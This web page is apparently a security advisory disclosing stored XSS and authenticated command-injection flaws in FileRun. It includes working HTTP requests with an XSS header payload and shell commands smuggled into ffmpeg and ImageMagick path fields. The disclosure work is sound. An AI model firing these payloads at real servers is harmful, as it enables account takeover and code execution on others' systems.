<!DOCTYPE html>
<html>
<head>

    <!-- Document Settings -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />

    <!-- Base Meta -->
    <!-- dynamically fixing the title for tag/author pages -->



    <title>Advisory for Filerun <= 2021.03.26</title>
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- Styles'n'Scripts -->
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
    <!-- highlight.js -->
    <link rel="stylesheet" href="/static/css/highlight.css">
    <style>.hljs { background: none; }</style>

    <!--[if IE]>
        <style>
            p, ol, ul{
                width: 100%;
            }
            blockquote{
                width: 100%;
            }
        </style>
    <![endif]-->
    
    <!-- This tag outputs SEO meta+structured data and other important settings -->
    <meta name="description" content="Security Blog" />
    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/png" />
    <link rel="canonical" href="/filerun-advisory" />
    <meta name="referrer" content="no-referrer-when-downgrade" />

     <!--title below is coming from _includes/dynamic_title-->
    <meta property="og:site_name" content="syntegris security blog" />
    <meta property="og:type" content="website" />
    <meta property="og:title" content="Advisory for Filerun <= 2021.03.26" />
    <meta property="og:description" content="We discovered multiple vulnerabilities in Filerun &lt;= 2021.03.26. The vulnerabilities were fixed in Filerun 2021.06.27. CVE ID Type CVE-2021-35503 Stored Cross-Site-Scripting (unauthenticated) in HTTP header CVE-2021-35504 Remote Code Execution (authenticated) using checkFFmpeg CVE-2021-35505 Remote Code Execution (authenticated) using checkImageMagick CVE-2021-35506 Stored Cross-Site-Scripting (authenticated) in HTML-Editor CVE-2021-35503 Sending a malicious X-Forwarded-For" />
    <meta property="og:url" content="/filerun-advisory" />
    <meta property="og:image" content="/assets/images/blog-cover.jpg" />
    
    <meta property="article:published_time" content="2021-09-23T10:00:00+00:00" />
    <meta property="article:modified_time" content="2021-09-23T10:00:00+00:00" />
    <meta property="article:tag" content="Advisory" />
    <meta name="twitter:card" content="summary_large_image" />
    <meta name="twitter:title" content="Advisory for Filerun <= 2021.03.26" />
    <meta name="twitter:description" content="We discovered multiple vulnerabilities in Filerun &lt;= 2021.03.26. The vulnerabilities were fixed in Filerun 2021.06.27. CVE ID Type CVE-2021-35503 Stored Cross-Site-Scripting (unauthenticated) in HTTP header CVE-2021-35504 Remote Code Execution (authenticated) using checkFFmpeg CVE-2021-35505 Remote Code Execution (authenticated) using checkImageMagick CVE-2021-35506 Stored Cross-Site-Scripting (authenticated) in HTML-Editor CVE-2021-35503 Sending a malicious X-Forwarded-For" />
    <meta name="twitter:url" content="/" />
    <meta name="twitter:image" content="/assets/images/blog-cover.jpg" />
    <meta name="twitter:label1" content="Written by" />
    <meta name="twitter:data1" content="syntegris security blog" />
    <meta name="twitter:label2" content="Filed under" />
    <meta name="twitter:data2" content="Advisory" />
    <meta name="twitter:site" content="@syntegris" />
    <meta name="twitter:creator" content="@syntegris" />
    <meta property="og:image:width" content="1400" />
    <meta property="og:image:height" content="933" />

    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Website",
    "publisher": {
        "@type": "Organization",
        "name": "syntegris security blog",
        "logo": "/assets/images/blog-icon.png"
    },
    "url": "/filerun-advisory",
    "image": {
        "@type": "ImageObject",
        "url": "/assets/images/blog-cover.jpg",
        "width": 2000,
        "height": 666
    },
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "/filerun-advisory"
    },
    "description": "We discovered multiple vulnerabilities in Filerun &lt;= 2021.03.26. The vulnerabilities were fixed in Filerun 2021.06.27. CVE ID Type CVE-2021-35503 Stored Cross-Site-Scripting (unauthenticated) in HTTP header CVE-2021-35504 Remote Code Execution (authenticated) using checkFFmpeg CVE-2021-35505 Remote Code Execution (authenticated) using checkImageMagick CVE-2021-35506 Stored Cross-Site-Scripting (authenticated) in HTML-Editor CVE-2021-35503 Sending a malicious X-Forwarded-For"
}
    </script>

    <link rel="alternate" type="application/rss+xml" title="Advisory for Filerun <= 2021.03.26" href="/feed.xml" />


</head>
<body class="post-template">

    <div class="site-wrapper">
        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
        <!-- default -->

<!-- The tag above means: insert everything in this file
into the {body} of the default.hbs template -->

<header class="site-header outer">
    <div class="inner">
        <nav class="site-nav">
    <div class="site-nav-left">
        
            
                <a class="site-nav-logo" href="/"><img src="/assets/images/blog-icon.png" alt="syntegris security blog" /></a>
            
        
        
            <ul class="nav" role="menu">
    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
    <li class="nav-getting-started" role="menuitem"><a href="/tag/advisory/">Security Advisories</a></li>
</ul>

        
    </div>
    <div class="site-nav-right">
        <div class="social-links">
            
                <a class="social-link social-link-tw" href="https://twitter.com/syntegris" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
</a>
            
        </div>
    </div>
</nav>

    </div>
</header>

<!-- Everything inside the #post tags pulls data from the post -->
<!-- #post -->

<main id="site-main" class="site-main outer" role="main">
    <div class="inner">

        <article class="post-full  tag-advisory post no-image">

            <header class="post-full-header">
                <section class="post-full-meta">
                    <time class="post-full-meta-date" datetime="23 September 2021">23 September 2021</time>
                    
                        <span class="date-divider">/</span>
                        
                            
                               <a href='/tag/advisory/'>ADVISORY</a>
                            
                        
                    
                </section>
                <h1 class="post-full-title">Advisory for Filerun <= 2021.03.26</h1>
            </header>

            

            <section class="post-full-content">
                <div class="kg-card-markdown">
                    <p>We discovered multiple vulnerabilities in <a href="https://filerun.com">Filerun</a> &lt;= 2021.03.26.
The vulnerabilities were fixed in Filerun 2021.06.27.</p>

<table>
  <thead>
    <tr>
      <th>CVE ID</th>
      <th>Type</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>CVE-2021-35503</td>
      <td>Stored Cross-Site-Scripting (unauthenticated) in HTTP header</td>
    </tr>
    <tr>
      <td>CVE-2021-35504</td>
      <td>Remote Code Execution (authenticated) using <em>checkFFmpeg</em></td>
    </tr>
    <tr>
      <td>CVE-2021-35505</td>
      <td>Remote Code Execution (authenticated) using <em>checkImageMagick</em></td>
    </tr>
    <tr>
      <td>CVE-2021-35506</td>
      <td>Stored Cross-Site-Scripting (authenticated) in HTML-Editor</td>
    </tr>
  </tbody>
</table>

<h2 id="cve-2021-35503">CVE-2021-35503</h2>
<p>Sending a malicious <em>X-Forwarded-For</em> header results in a stored XSS in the activity logs. 
The code is triggered if an admin views or archives the logs.
Filerun blocks brute force attacks. To prevent account lock out, use a non-existent username.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=fileman&amp;page=login&amp;action=login HTTP/1.1
Host: localhost
Content-Length: 66
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: iframe
Referer: http://localhost/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
X-Forwarded-For: &lt;iMg onerror=alert(1) src=a&gt;
Cookie: FileRunSID=a99a9ba3867833fd1af9b6549eb83524
Connection: close

username=filerun&amp;password=password&amp;otp=&amp;two_step_secret=&amp;language=
</code></pre></div></div>

<p>The severity can be summarized as critical.</p>

<p>An unauthenticated remote attacker will gain access to all files of all users. 
He could edit the files or put the application in maintenance mode, which would impact availability.
He could become an administrator user by stealing sessions or exploit other vulnerabilities in this Filerun version.</p>

<h2 id="cve-2021-35504">CVE-2021-35504</h2>
<p>An attacker with access to the admin backend can abuse the <em>checkFFmpeg</em> action to trigger code execution in the context of the webserver user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=cpanel&amp;section=settings&amp;page=image_preview&amp;action=checkFFmpeg HTTP/1.1
Host: localhost
Content-Length: 29
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/?module=cpanel
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: FileRunSID=887bebeb478e22731a2cabdeb0cf876e
Connection: close

path=ffmpeg%7Cecho%20%60ls%60
</code></pre></div></div>

<p>The severity can be summarized as high.</p>

<p>The attacker requires access to a higher privileged account of the application (e.g. through <em>CVE-2021-35503</em>).
He/She is able to escalate their privileges to the context of the web server user.</p>

<h2 id="cve-2021-35505">CVE-2021-35505</h2>
<p>An attacker with access to the admin backend can abuse the <em>checkImageMagick</em> action to trigger code execution in the context of the webserver user.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /?module=cpanel&amp;section=settings&amp;page=image_preview&amp;action=checkImageMagick HTTP/1.1
Host: localhost
Content-Length: 40
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/?module=cpanel
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: FileRunSID=887bebeb478e22731a2cabdeb0cf876e
Connection: close

mode=exec&amp;path=convert%7Cecho%20%60ls%60
</code></pre></div></div>

<p>The severity can be summarized as high.</p>

<p>The attacker requires access to a higher privileged account of the application (e.g. through <em>CVE-2021-35503</em>).
He/She is able to escalate their privileges to the context of the web server user.</p>

<h2 id="cve-2021-35506">CVE-2021-35506</h2>
<p>An attacker can upload an HTML file with malicious javascript code. The code is executes when a user views or edits this file using the HTML-Editor.</p>

<p>The severity can be summarized as critical.</p>

<p>A low privileged attacker will gain access to all files of all users. He could edit the files or put the application in
maintenance mode, which would impact availability. He could become an administrator user by stealing sessions (or trigger <em>CVE-2021-35504</em> or <em>CVE-2021-35505</em>).</p>

<h2 id="exploit-chain">Exploit Chain</h2>
<p>We published a <a href="https://www.exploit-db.com/exploits/50313">Proof of Concept</a> that exploits <em>CVE-2021-35503</em> and <em>CVE-2021-35505</em>.
The code injects Javascript into the Activity Log Feed, that triggers the Remote Code Execution as soon as the administrator visits the page.
This will upload a <em>shell.php</em> file in the web root.</p>

<h2 id="demo">Demo</h2>
<video muted="" controls="" src="assets/filerun.2021.35503.and.35505.small.mp4"></video>

<p><strong>Thanks to the Filerun team to address these findings immediately.</strong></p>

                </div>
            </section>

            <footer class="post-full-footer">
                <!-- Everything inside the #author tags pulls data from the author -->
                <!-- #author-->
                
                    
                        <section class="author-card">
                            
                            <section class="author-card-content">
                                <h4 class="author-card-name"><a href="/author/chris">Chris</a></h4>
                                
                                    <p>Pentester</p>
                                
                            </section>
                        </section>
                        <div class="post-full-footer-right">
                            <a class="author-card-button" href="/author/chris">Read More</a>
                        </div>
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                    
                
                <!-- /author  -->
            </footer>
        </article>

    </div>
</main>

<!-- Links to Previous/Next posts -->
<aside class="read-next outer">
    <div class="inner">
        <div class="read-next-feed">
            
                
                
                
                
            

            <!-- If there's a next post, display it using the same markup included from - partials/post-card.hbs -->
            

            <!-- If there's a previous post, display it using the same markup included from - partials/post-card.hbs -->
            

        </div>
    </div>
</aside>

<!-- Floating header which appears on-scroll, included from includes/floating-header.hbs -->
<div class="floating-header">
    <div class="floating-header-logo">
        <a href="/">
            
                <img src="/assets/images/favicon.png" alt="syntegris security blog icon" />
            
            <span>syntegris security blog</span>
        </a>
    </div>
    <span class="floating-header-divider">&mdash;</span>
    <div class="floating-header-title">Advisory for Filerun <= 2021.03.26</div>
    <div class="floating-header-share">
        <div class="floating-header-share-label">Share this <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
    <path d="M7.5 15.5V4a1.5 1.5 0 1 1 3 0v4.5h2a1 1 0 0 1 1 1h2a1 1 0 0 1 1 1H18a1.5 1.5 0 0 1 1.5 1.5v3.099c0 .929-.13 1.854-.385 2.748L17.5 23.5h-9c-1.5-2-5.417-8.673-5.417-8.673a1.2 1.2 0 0 1 1.76-1.605L7.5 15.5zm6-6v2m-3-3.5v3.5m6-1v2"/>
</svg>
</div>
        <a class="floating-header-share-tw" href="https://twitter.com/share?text=Advisory+for+Filerun+%3C%3D+2021.03.26&amp;url=https://syntegris-sec.github.io/filerun-advisory"
            onclick="window.open(this.href, 'share-twitter', 'width=550,height=235');return false;">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>

        </a>
    </div>
    <progress class="progress" value="0">
        <div class="progress-container">
            <span class="progress-bar"></span>
        </div>
    </progress>
</div>


<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->


        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="/">syntegris security blog</a> &copy; 2021</section>
                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                    <a href="https://twitter.com/syntegris" target="_blank" rel="noopener">Twitter</a>
                </nav>
            </div>
        </footer>

    </div>

    <!-- highlight.js -->
    <script type="text/javascript" src="/static/js/jquery.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>

    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    

    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>

// NOTE: Scroll performance is poor in Safari
// - this appears to be due to the events firing much more slowly in Safari.
//   Dropping the scroll event and using only a raf loop results in smoother
//   scrolling but continuous processing even when not scrolling
$(document).ready(function () {
    // Start fitVids
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
    // End fitVids

    var progressBar = document.querySelector('progress');
    var header = document.querySelector('.floating-header');
    var title = document.querySelector('.post-full-title');

    var lastScrollY = window.scrollY;
    var lastWindowHeight = window.innerHeight;
    var lastDocumentHeight = $(document).height();
    var ticking = false;

    function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
    }

    function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
    }

    function requestTick() {
        if (!ticking) {
            requestAnimationFrame(update);
        }
        ticking = true;
    }

    function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
            header.classList.add('floating-active');
        } else {
            header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
    }

    window.addEventListener('scroll', onScroll, {passive: true});
    window.addEventListener('resize', onResize, false);

    update();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
